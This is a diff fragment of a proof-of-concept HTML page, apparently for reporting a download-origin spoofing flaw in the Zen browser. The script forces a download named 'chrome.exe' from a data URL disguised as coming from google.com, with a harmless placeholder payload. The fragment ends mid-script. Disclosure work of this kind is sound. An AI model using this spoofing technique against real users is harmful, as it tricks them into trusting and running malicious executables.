@@ -24,15 +24,15 @@
 <body>
 <main>
   <h1>Poc Download Spoofing</h1>
-  <p>Click to download. The page then opens the Chrome site.</p>
+  <p>Click to download. Then hover the row in the Zen download list.</p>
   <button id="go">Download</button>
 </main>
 
 <script>
   document.getElementById("go").onclick = () => {
     const a = document.createElement("a");
-    a.href = "data:,https://chrome.google.com";
-    a.download = "chrome-pro.exe";
+    a.href = "data://google.com/application/x-msdownload;base64,ZXN0Z3Vlc3Q=";
+    a.download = "chrome.exe";
     a.click();
 
     setTimeout(() => {
